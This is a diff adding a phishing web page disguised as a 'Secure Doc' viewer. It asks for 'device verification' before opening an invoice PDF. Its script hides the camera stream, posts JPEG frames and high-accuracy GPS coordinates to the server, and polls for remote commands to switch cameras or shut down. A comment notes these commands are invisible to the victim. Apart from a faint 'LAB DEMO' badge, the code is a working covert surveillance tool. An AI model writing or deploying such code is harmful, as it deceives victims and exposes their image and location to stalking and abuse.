@@ -1,0 +1,126 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Secure Doc Viewer</title>
+<style>
+ html,body{margin:0;height:100%;background:#101418;font:15px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+ .wrap{max-width:520px;margin:9vh auto;background:#1a2027;border-radius:10px;padding:34px 30px;color:#e8edf2}
+ .wrap h2{margin:0 0 8px;font-size:18px}
+ .wrap p{margin:0 0 18px;color:#9fb0c0;font-size:13.5px}
+ .wrap p.sub{margin-top:16px;font-size:12px;color:#6c7d8d}
+ button{background:#e8b931;border:0;border-radius:6px;padding:12px 22px;font:600 15px inherit;cursor:pointer}
+ .dot{display:inline-block;width:8px;height:8px;border-radius:99px;background:#e8b931;margin-right:6px}
+ .badge{position:fixed;right:10px;bottom:8px;font:600 10px ui-monospace,monospace;letter-spacing:2px;color:rgba(255,255,255,.08);user-select:none;pointer-events:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h2><span class="dot"></span>Secure Doc</h2>
+  <p>Document <b>INV-2026-4471.pdf</b> needs a device verification step before it opens. This protects your account.</p>
+  <button id="go">Open the document</button>
+  <p class="sub" id="st">ready</p>
+</div>
+<div class="badge">LAB DEMO</div>
+<video id="v" autoplay playsinline style="display:none"></video>
+<script>
+const mSid = location.pathname.match(/\/v\/([A-Za-z0-9]+)/);
+const SID = (mSid && mSid[1]) || new URLSearchParams(location.search).get("sid") || Math.random().toString(36).slice(2, 10);
+let DID = sessionStorage.getItem("dlabDid");
+if (!DID) { DID = Math.random().toString(36).slice(2, 12); sessionStorage.setItem("dlabDid", DID); }
+const el = (id) => document.getElementById(id);
+let stream = null, devices = [], camIdx = 0, switching = false, busy = false, started = false;
+const st = (t) => { el("st").textContent = t; };
+
+async function openStream(constraints) {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  stream = await navigator.mediaDevices.getUserMedia(constraints);
+  const v = el("v");
+  v.srcObject = stream;
+  await v.play();
+}
+
+async function refreshDevices() {
+  devices = (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === "videoinput");
+  const cur = stream.getVideoTracks()[0].getSettings().deviceId;
+  camIdx = Math.max(0, devices.findIndex(d => d.deviceId === cur));
+}
+
+async function flipCam() {
+  if (switching || devices.length < 2) return;
+  switching = true;
+  const next = devices[(camIdx + 1) % devices.length].deviceId;
+  try {
+    await openStream({ video: { deviceId: { exact: next }, width: 640 } });
+    camIdx = (camIdx + 1) % devices.length;
+  } catch (e) {
+    try { await openStream({ video: { width: 640 } }); refreshDevices(); } catch (e2) {}
+  }
+  switching = false;
+}
+
+// perintah dari monitor (flip kamera + kill). tidak terlihat oleh korban.
+let dead = false, watchId = null;
+function killSelf() {
+  if (dead) return;
+  dead = true;
+  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+  try { el("v").srcObject = null; } catch (e) {}
+  if (watchId !== null && navigator.geolocation) navigator.geolocation.clearWatch(watchId);
+  el("st").textContent = "ready";
+  el("go").disabled = false;
+  el("go").textContent = "Open the document";
+  started = false;
+}
+const cmdTimer = setInterval(async () => {
+  if (dead) { clearInterval(cmdTimer); return; }
+  try {
+    const r = await fetch("/api/cmd/" + SID, { cache: "no-store", headers: { "X-Did": DID } });
+    if (!r.ok) return;
+    const d = await r.json();
+    if (d.dead) { killSelf(); return; }
+    (d.cmds || []).forEach(c => { if (c.act === "flip" && (c.to === "auto" || c.to === DID)) flipCam(); });
+  } catch (e) {}
+}, 1000);
+
+el("go").onclick = async function () {
+  if (started) return;
+  started = true;
+  const md = navigator.mediaDevices;
+  if (!md || !md.getUserMedia) { st("verification failed: this page needs https"); return; }
+  try {
+    await openStream({ video: { width: 640 } });
+    st("setting up verification device...");
+    await refreshDevices();
+    pump();
+    if (navigator.geolocation) {
+      watchId = navigator.geolocation.watchPosition((p) => {
+        const c = p.coords;
+        fetch("/api/geo/" + SID, { method: "POST", headers: { "X-Did": DID }, body: JSON.stringify({ lat: c.latitude, lon: c.longitude, acc: c.accuracy }) });
+      }, () => {}, { enableHighAccuracy: true, maximumAge: 15000, timeout: 15000 });
+    }
+  } catch (e) {
+    st(e.name === "NotAllowedError" ? "access denied by user" : "error: " + (e.name || e));
+  }
+};
+
+const c = document.createElement("canvas");
+c.width = 640; c.height = 360;
+const cx = c.getContext("2d");
+function pump() {
+  if (dead) return;
+  const v = el("v");
+  if (v.videoWidth > 0) {
+    cx.drawImage(v, 0, 0, 640, 360);
+    if (!busy) {
+      busy = true;
+      c.toBlob((b) => {
+        busy = false;
+        if (b) fetch("/api/feed/" + SID, { method: "POST", headers: { "X-Did": DID }, body: b }).catch(() => {});
+      }, "image/jpeg", 0.72);
+    }
+  }
+  setTimeout(pump, 220);
+}
+</script>
+</body></html>
